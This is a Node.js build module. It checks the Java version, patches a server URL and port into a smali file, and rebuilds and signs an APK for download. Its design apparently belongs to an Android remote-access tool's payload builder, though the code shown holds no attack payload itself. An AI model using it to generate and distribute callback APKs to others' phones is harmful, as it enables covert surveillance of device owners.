const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    CONST = require('./const');

// Minimum supported Java version
const MIN_JAVA_VERSION = 17;

/**
 * Clean build directory before building
 * @param {Function} cb - Callback
 */
function cleanBuildDir(cb) {
    const buildDir = path.join(CONST.smaliPath, 'build');
    
    fs.rm(buildDir, { recursive: true, force: true }, (err) => {
        if (err && err.code !== 'ENOENT') {
            console.warn('Warning: Could not clean build directory:', err.message);
        }
        cb();
    });
}

/**
 * Check Java version - supports Java 17 and above
 * @param {Function} callback - Callback with (error, version)
 */
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    
    spawn.on('close', function (code) {
        // Parse version from output
        const versionMatch = output.match(/(?:java|openjdk) version "(\d+)(?:\.(\d+))?(?:\.(\d+))?/i) ||
                            output.match(/(?:java|openjdk) (\d+)(?:\.(\d+))?(?:\.(\d+))?/i);
        
        if (versionMatch) {
            const majorVersion = parseInt(versionMatch[1], 10);
            const versionString = output.split('\n')[0].trim();
            
            // Accept Java 17 and above (also accept legacy 1.8.0 format for backwards compatibility)
            if (majorVersion >= MIN_JAVA_VERSION || (majorVersion === 1 && parseInt(versionMatch[2], 10) >= 8)) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, versionString);
            } else {
                return callback(`Java version ${majorVersion} detected. Please use Java ${MIN_JAVA_VERSION} or higher. Detected: ${versionString}`, undefined);
            }
        } else {
            return callback("Java Not Installed or version could not be detected", undefined);
        }
    });
}

/**
 * Patch the APK with custom URI and PORT
 * @param {string} URI - Server URI (can include protocol like https://domain.com)
 * @param {number} PORT - Server port (use 0 or null to omit port, useful for https on 443)
 * @param {boolean} useSSL - Whether to use HTTPS instead of HTTP
 * @param {Function} cb - Callback
 */
function patchAPK(URI, PORT, useSSL, cb) {
    // Handle backwards compatibility if useSSL is the callback (old API)
    if (typeof useSSL === 'function') {
        cb = useSSL;
        useSSL = false;
    }
    
    // Validate port if provided
    if (PORT && (PORT < 1 || PORT > 65535)) {
        return cb('Invalid port number. Must be between 1 and 65535');
    }
    
    fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
        if (err) {
            console.error('Patch file read error:', err);
            return cb('File Patch Error - READ: ' + err.message);
        }
        
        // Match both http:// and https:// URLs
        const urlPattern = /https?:\/\/[^?]+(?=\?model=)/;
        
        // Determine protocol
        const protocol = useSSL ? 'https' : 'http';
        
        // Build new URL - omit port for HTTPS on 443 or if PORT is 0/null
        let newUrl;
        if (!PORT || PORT === 0 || (useSSL && PORT === 443) || (!useSSL && PORT === 80)) {
            newUrl = `${protocol}://${URI}`;
        } else {
            newUrl = `${protocol}://${URI}:${PORT}`;
        }
        
        console.log(`Patching APK with URL: ${newUrl}`);
        
        if (!urlPattern.test(data)) {
            return cb('File Patch Error - URL pattern not found in file');
        }
        
        const result = data.replace(urlPattern, newUrl);
        
        fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
            if (err) {
                console.error('Patch file write error:', err);
                return cb('File Patch Error - WRITE: ' + err.message);
            }
            return cb(false);
        });
    });
}

/**
 * Build the APK using apktool and sign it
 * @param {Function} cb - Callback
 */
function buildAPK(cb) {
    // First clean the build directory to avoid permission issues
    cleanBuildDir(() => {
        javaversion(function (err, version) {
            if (err) {
                return cb(err);
            }
            
            console.log(`Building APK with ${version}`);
            
            // Build the APK
            cp.exec(CONST.buildCommand, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
                if (error) {
                    console.error('Build error:', stderr);
                    return cb('Build Command Failed - ' + error.message);
                }
                
                console.log('Build successful, signing APK...');
                
                // Sign the APK
                cp.exec(CONST.signCommand, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
                    if (error) {
                        console.error('Sign error:', stderr);
                        return cb('Sign Command Failed - ' + error.message);
                    }
                    
                    console.log('APK signed successfully');
                    
                    // Copy signed APK to the download location (build.s.apk for backwards compatibility)
                    const signedApkPath = CONST.apkBuildPath.replace('.apk', '.s.apk');
                    fs.copyFile(CONST.apkBuildPath, signedApkPath, (err) => {
                        if (err) {
                            console.error('Copy error:', err);
                            return cb('Failed to copy signed APK: ' + err.message);
                        }
                        console.log('APK ready for download at', signedApkPath);
                        return cb(false);
                    });
                });
            });
        });
    });
}

/**
 * Get current Java version info
 * @param {Function} cb - Callback
 */
function getJavaInfo(cb) {
    javaversion((err, version) => {
        if (err) {
            cb({ installed: false, error: err });
        } else {
            cb({ installed: true, version: version });
        }
    });
}

module.exports = {
    buildAPK,
    patchAPK,
    getJavaInfo,
    javaversion
}
